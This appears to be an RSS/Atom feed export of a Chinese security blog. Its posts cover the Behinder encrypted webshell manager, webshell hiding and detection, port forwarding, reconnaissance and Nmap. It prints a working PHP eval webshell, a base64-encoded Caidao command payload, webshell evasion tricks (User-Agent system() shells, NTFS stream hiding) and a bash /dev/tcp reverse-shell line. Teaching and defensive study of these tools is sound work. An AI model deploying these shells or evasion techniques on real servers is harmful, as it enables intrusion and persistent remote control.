    <content type="html"><![CDATA[<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><p>“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，最早的webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。</p><h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p> 一句话木马是一般是指一段短小精悍的恶意代码，这段代码可以用作一个代理来执行攻击者发送过来的任意指令，比如最常见的<code>eval($_REQUEST[&quot;a&quot;]);</code>。</p><p> 但是随着防御手段的发展，也出现了很多的防御工具。一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测。另一类是是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测。</p><p> 而我们发送Payload被拦截的原因就在于，客户端发送的请求特征太明显，比如菜刀的payload<br> <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caidao=Response.Write(<span class="string">&quot;-&gt;|&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> err:Exception;<span class="keyword">try</span>&#123;eval(System.Text.Encoding.GetEncoding(<span class="number">65001</span>).GetString(System. Convert.FromBase64String(<span class="string">&quot;dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D&quot;</span>)),<span class="string">&quot;unsafe&quot;</span>);&#125;<span class="keyword">catch</span>(err)&#123;Response.Write(<span class="string">&quot;ERROR:// &quot;</span>%2Berr.message);&#125;Response.Write(<span class="string">&quot;|&lt;-&quot;</span>);Response.End();&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%<span class="number">3D</span>%<span class="number">3D</span></span><br></pre></td></tr></table></figure><br>虽然关键的代码采用了base64编码，但是payload中扔有多个明显的特征，比如有eval关键词，有Convert.FromBase64String，有三个参数，参数名为caidao（密码字段）、z1、z2，参数值有base64编码。根据这些特征很容易写出对应的防护规则，比如：POST请求中有Convert.FromBase64String关键字，有z1和z2参数，z1参数值为4个字符，z2参数值为base64编码字符。</p><p>冰蝎就考虑通过动态二进制编码的思路来绕过防火墙，具体流程如下：</p><ol><li>首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器侧的Session中。</li><li>客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。</li><li>服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。</li><li>服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。</li><li>客户端解密服务器端返回的结果。<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-1.png"></li></ol><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>直接在github上下载，<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11">传送门</a></p><p>下载后直接解压，得到一个jar包，本地有java环境就可以直接运行</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>在自己的php环境中写一个一句话木马，其代码如图所示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span>=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">@<span class="keyword">new</span> C(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用冰蝎连接<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-2.png"></p><p>双击增加的链接显示出phpinfo()即成功！<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-3.png"></p><p>虚拟终端(在windows平台上可以是exec或者powershell)</p><p>反弹shell，这个很有用<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-4.png"></p><p>数据库可视化功能<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;冰蝎&quot;&gt;&lt;a href=&quot;#冰蝎&quot; class=&quot;headerlink&quot; title=&quot;冰蝎&quot;&gt;&lt;/a&gt;冰蝎&lt;/h2&gt;&lt;p&gt;“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，最早的webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测。基于</summary>
      
    
    
    
    
    <category term="工具" scheme="http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>渗透之域渗透</title>
    <link href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    <id>http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/</id>
    <published>2021-03-12T08:01:51.000Z</published>
    <updated>2021-07-18T10:45:21.493Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-什么是域"><a href="#1-什么是域" class="headerlink" title="1.什么是域"></a>1.什么是域</h2><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，<code>域控制器</code>中保存着整个域的用户帐号和安全数据库。</p><p>(域是一种逻辑结构，是指一个有安全边界的集合，同一个域中的计算机彼此之间建立信任关系，计算机之间允许互相访问)</p><blockquote><p>域控制器（Domain controller，简称DC）是指在计算机网络域内响应安全身份认证请求的网络服务器负责允许发出请求的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息，并执行域的安全策略。</p></blockquote><h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-什么是域&quot;&gt;&lt;a href=&quot;#1-什么是域&quot; class=&quot;headerlink&quot; title=&quot;1.什么是域&quot;&gt;&lt;/a&gt;1.什么是域&lt;/h2&gt;&lt;p&gt;将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透之webshell</title>
    <link href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8Bwebshell/"/>
    <id>http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8Bwebshell/</id>
    <published>2021-03-12T08:01:51.000Z</published>
    <updated>2021-07-12T12:19:41.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell是以asp、jsp、php或cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门</p><blockquote><p>cgi（common gateway interface）：公共网关接口</p></blockquote><p>常用的攻击方式有：直接上传文件、SQL注入、远程文件包含（RFI）、甚至使用XSS作为攻击的一部分。</p><h2 id="如何隐藏webshell"><a href="#如何隐藏webshell" class="headerlink" title="如何隐藏webshell"></a>如何隐藏webshell</h2><ol><li><p>将指令隐藏在UA，而不是放在$_POST传递命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_SERVER</span>(<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>))&gt;</span><br></pre></td></tr></table></figure><p>这种方式会在服务器日志中留下痕迹，很容易被识别</p></li><li><p>动态函数执行，把一个函数名当成一个字符串传递给一个变量，然后去执行(类似的：把执行命令分别放在一个文件中，然后用另一个文件去包括)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo&quot;</span>; <span class="variable">$a</span>()&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用各种编码比如hex、base64等，而且目录层数越深越好，尽量把上传的webshell放到四五级目录下</p></li><li><p>webshell里面尽量不要用类似<code>eval，exec,system,assert</code>这样敏感的特征，因为awk很容易检测出来。可以自己写一些自定义函数，或者使用<code> call_user_func</code>这样的回调函数来构造webshell。</p></li><li><p>在win sever环境下，使用windows中的隐藏文件 — NTFS文件流（ADS）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ~&lt;?php @eval($_POST[&#x27;chaper&#x27;]);?~&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样就生成了一个不可见的文件，常规的文件管理器，type命令，dir命令都不能发现这个<code>index.php:hidden.jpg</code>,这个文件只能通过命令<code>notepad index.php:hidden.jpg</code>打开。</p></li></ol><h2 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h2><h3 id="1-基于webshell的特征检测"><a href="#1-基于webshell的特征检测" class="headerlink" title="1.基于webshell的特征检测"></a>1.基于webshell的特征检测</h3><p>常见的webshelll函数</p><ol><li>存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等；</li><li>存在系统调用的文件操作函数，如fopen、fwrite、readdir等</li><li>存在数据库操作函数，调用系统自身的存储过程来连接数据库操作；</li></ol><p>这种基于特征值、危险函数的特征检测只能查找已知的webshell，无法查找0day型的webshell，而且误报率比较高。对于大型的网站，可以使用强弱特征，即把特征分为强弱两种特征，强特征命中则是webshell，弱特征由人工去判断</p><h3 id="2-基于流量特征的webshell检测"><a href="#2-基于流量特征的webshell检测" class="headerlink" title="2.基于流量特征的webshell检测"></a>2.基于流量特征的webshell检测</h3><p>webshell通信是HTTP协议。只要我们把webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好。webshell如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。如果黑客反向连接的话，Agent和IDS都可以检测到。Webshell总有一个HTTP请求，如果在网络层监控HTTP，并且检测到有人访问了一个从没反问过的文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p><p>比如中国菜刀的流量特征就很明显</p><h3 id="3-日志检测"><a href="#3-日志检测" class="headerlink" title="3. 日志检测"></a>3. 日志检测</h3><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，这是：HTTP异常请求模型检测。例如：一个平时是GET的请求突然有了POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。</p><p>ebshell的访问特征(主要特征)</p><ol><li>少量ip对其发起访问</li><li>总的访问次数少</li></ol><p>优点：采用了一定数据分析的方式，网站的访问量达到一定量级时这种检测方法的结果具有较大参考价值。</p><p>缺点：存在一定误报，对于大量的访问日志，检测工具的处理能力和效率会比较低。</p><h2 id="webshell防御"><a href="#webshell防御" class="headerlink" title="webshell防御"></a>webshell防御</h2><ol><li>建议用户通过ftp来上传、维护网页，尽量不安装asp，php的上传程序。</li><li>对asp，php上传程序的调用一定要进行身份认证，并只允许信任的人使用上传程序。</li><li>利用白名单上传文件，上传目录权限遵循最小权限原则。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;webshell&quot;&gt;&lt;a href=&quot;#webshell&quot; class=&quot;headerlink&quot; title=&quot;webshell&quot;&gt;&lt;/a&gt;webshell&lt;/h2&gt;&lt;p&gt;webshell是以asp、jsp、php或cgi等网页文件形式存在的一种命令执行环境，也可</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透之端口转发</title>
    <link href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2021-03-12T08:01:51.000Z</published>
    <updated>2021-07-12T02:53:21.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：</p><ol><li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙</li><li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口</li></ol><p>常用的方法有</p><p><code>nc、lcx、socks、bash反弹、MSF后门反弹、frp</code></p><h2 id="nc端口转发"><a href="#nc端口转发" class="headerlink" title="nc端口转发"></a>nc端口转发</h2><p>背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 </p><ol><li>在192.168.50.2上开启8000端口<br><code>nc -l 8000</code></li><li>在192.168.50.2上实现9000端口转发<br><code>cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo</code></li><li>在192.168.50.1上连接192.168.50.2的9000端口<br><code>nc -vn 192.168.50.2 9000</code></li></ol><h2 id="Shell命令实现端口转发"><a href="#Shell命令实现端口转发" class="headerlink" title="Shell命令实现端口转发"></a>Shell命令实现端口转发</h2><ol><li>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost </span><br><span class="line"><span class="meta">#</span><span class="bash"> 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987</span></span><br><span class="line">ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost</span><br><span class="line"><span class="meta">#</span><span class="bash"> 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口.</span></span><br></pre></td></tr></table></figure>案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可</li></ol><p>ssh -CfNg -L 6300:127.0.0.1:80 userc@C</p><p>ssh -CfNg -R 80:127.0.0.1:6300 usera@A</p><p>服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例:</p><p>tcpdump -s 0 -i lo port 6300</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;端口转发&quot;&gt;&lt;a href=&quot;#端口转发&quot; class=&quot;headerlink&quot; title=&quot;端口转发&quot;&gt;&lt;/a&gt;端口转发&lt;/h2&gt;&lt;p&gt;在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>web安全之信息收集</title>
    <link href="http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-03-11T08:01:51.000Z</published>
    <updated>2021-07-03T10:50:27.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>在web渗透中，信息收集的深度与广度决定了后续渗透测试的成功与否，所以我们需要尽可能的收集目标的所有信息；收集方向大概分为以下几点：</p><ul><li>有无CDN</li><li>有无WAF</li><li>组织信息</li><li>搭建环境</li><li>站点架构</li><li>网站源码获取</li><li>域名信息</li><li>有无APK</li><li>有无微信小程序</li><li>有无PC应用</li><li>自动批量信息收集</li><li>其它信息收集</li></ul><h2 id="2-信息收集思路"><a href="#2-信息收集思路" class="headerlink" title="2. 信息收集思路"></a>2. 信息收集思路</h2><ol><li><p>拿到渗透测试目标后，首先判断目标域名是否存在CDN，如果存在，需要先绕过CDN获取真实IP后再进行下一步，防止后续渗透测试全部测试到CDN节点上。</p><p><a href="https://cloud.tencent.com/developer/article/1634648">如何绕过CDN?</a></p></li><li><p>测试目标是否存在WAF，可以通过工具识别（存在误判）或者通过人工识别（根据拦截页面的图片判断）的方式判断是否存在WAF，什么类型的WAF，然后针对性的进行绕过.</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Nmap有一些脚本可以来测试WAF中是否存在于所有检测到的HTTP端口</span><br><span class="line">nmap -sT -sV-p <span class="number">80</span>,<span class="number">443</span>,<span class="number">8080</span>,<span class="number">8081</span> --script=http-waf-detect <span class="number">192.168</span><span class="number">.56</span><span class="number">.11</span></span><br><span class="line">nmap -p80,<span class="number">443</span> --script=http-waf-fingerprint www.example.com</span><br><span class="line"># SQLMap中自带的WAF识别模块可以识别出WAF的种类，但是如果所安装的WAF并没有什么特征，SQLMap就只能识别出类型是Generic。</span><br><span class="line">sqlmap.py -u “url” –identify-waf  –batch</span><br></pre></td></tr></table></figure></li><li><p>先从组织信息这块入手，获取到网站和管理员的一些信息（QQ,手机号，邮箱等等…），通过whois，网站备案信息获取更多目标；后期需要爆破时可以通过获取到的联系方式针对性的生成字典，提高爆破成功率；也可以利用联系方式在Github等托管平台搜索泄露的敏感信息</p></li><li><p>针对网站搭建环境需要收集目标操作系统是Windows还是Linux?具体内核版本是什么?开放了哪些端口和服务？后续可以针对性的进行测试(例如可以使用公开的缓冲区溢出，RCE，弱口令等安全漏洞进行测试)；收集到目标的中间件版本信息，数据库版本信息后，一样可以寻找相关安全漏洞进行测试(例如中间件解析漏洞,RCE,远程代码执行等等，数据库弱口令,未授权访问等等)。获取的Web接口（短信接口，支付接口等等）也可以作为渗透测试的一个突破口。了解网站使用的脚本语言也很重要，由于各种脚本语言的特性与机制，其产生的安全问题也有很大差异（例如PHP站点中经常出现SQL注入，文本包含等安全问题，而Java站点中则经常出现反序列化的安全漏洞）</p></li><li><p>网站的搭建架构也是不可忽视的部分，很多站点在同一台服务器上经常使用端口，目录，子域名等方式区分站点，所以我们渗透测试时需要对开放端口，网站目录，子域名等信息都要收集（在进行目录扫描时除了对网站域名进行扫描，也建议对网站IP进行扫描；例如某个网站 <a href="http://192.168.1.1/">http://192.168.1.1</a> 站点的根目录是www，其下域名test.com 的根目录是www/test.com 。如果在网站根目录www下存在test.com的源码备份，我们扫描时如果只针对域名进行目录扫描，是无法获取到源码备份的，只有通过对IP站点进行目录扫描才能发现test.com的源码备份）。</p></li><li><p>在渗透测试时，能获取到网站源码往往能达到事半功倍的效果。如果我们知道目标站点使用的是CMS搭建，那么我们就可以寻找该CMS公开漏洞进行测试；如果使用的是框架开发，那么也可以搜索该框架漏洞进行测试；或者我们可以利用获取的网站源码进行本地搭建测试寻找安全漏洞，也可以通过代码审计的方式挖掘0day。</p></li><li><p>如何获取网站源码：可以通过扫描网站目录获取源码备份；CMS可以直接去CMS官网下载；框架开发的站点可以去官网下载框架本地安装；某些正规源码（商城，博客，企业等等）可以通过搜索引擎在一些正规源码站获取，违法源码（BC，棋牌，私服，杀猪盘等等）也可以通过搜索引擎在一些黑源码站进行获取；某些站点可能使用了Github，Gitee等托管平台托管，也可能存在源码泄露的安全问题。</p></li><li><p> 针对域名的收集可以通过网站备案，Whois查询获取更多目标（Whois反查注册人，电话，邮箱等等）；通过IP地址反查绑定的域名信息；也可以通过搜索引擎或者在线平台获取目标子域名或利用工具进行子域名枚举；也可以利用空间引擎寻找同模板站点，在同模板站点获取源码后进行代码审计挖掘到漏洞后在转向测试目标；或者通过搜索域名中的关键字（例如 baidu.com 中的baidu，在搜索引擎或域名注册商处查询类似域名 baidu.cn，baidu.net等等)。或者对旁站C段进行信息收集，从旁站或C段入手，间接的拿下目标站点。</p></li><li><p> 假如目标只是一个单纯的APK下载页或PC程序下载页，或者是一个微信公众号，那么我们可以通过对这些APK&amp;微信小程序&amp;PC应用进行抓包或者逆向获取其中的URL和IP地址，转向Web渗透测试的思路。</p></li><li><p>在收集测试目标的Web目录，备份文件等信息时，除了使用Web目录文件扫描，还可以进行Fuzz，尽可能的收集更多信息；而后期在SQL注入，文件上传，XSS等漏洞挖掘或绕Waf时也可以使用Fuzz进行测试。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-信息收集&quot;&gt;&lt;a href=&quot;#1-信息收集&quot; class=&quot;headerlink&quot; title=&quot;1.信息收集&quot;&gt;&lt;/a&gt;1.信息收集&lt;/h2&gt;&lt;p&gt;在web渗透中，信息收集的深度与广度决定了后续渗透测试的成功与否，所以我们需要尽可能的收集目标的所有信息；收</summary>
      
    
    
    
    
    <category term="信息收集" scheme="http://yejuns.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>web安全之Nmap使用</title>
    <link href="http://yejuns.github.io/2021/03/03/NMap%E4%BD%BF%E7%94%A8/"/>
    <id>http://yejuns.github.io/2021/03/03/NMap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-03-03T13:21:21.000Z</published>
    <updated>2021-07-07T15:49:18.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>kali上已经自带，windows上去官网下载相关的安装包，centos就直接 <code>yum install nmap</code></p><h3 id="简单入门"><a href="#简单入门" class="headerlink" title="简单入门"></a>简单入门</h3><p>刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 <code>nmap your-ip（域名）</code> 就可以扫描出其对外开放的服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash">基本格式，会扫描该主机的所有端口</span></span><br><span class="line"></span><br><span class="line">nmap -p 8080 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断指定ip是否开放指定端口</span> </span><br><span class="line"></span><br><span class="line">nmap  -p 22,21,80 192.168.31.13</span><br><span class="line">nmap  -p 22,21,80 192.168.31.1-253</span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加端口和网段</span> </span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1/24</span><br><span class="line"><span class="meta">#</span><span class="bash"> 扫描整个子网的端口，这个过程可能会比较久</span></span><br></pre></td></tr></table></figure><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种</p><ol><li>Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务）</li><li>Closed，关闭状态（TCP 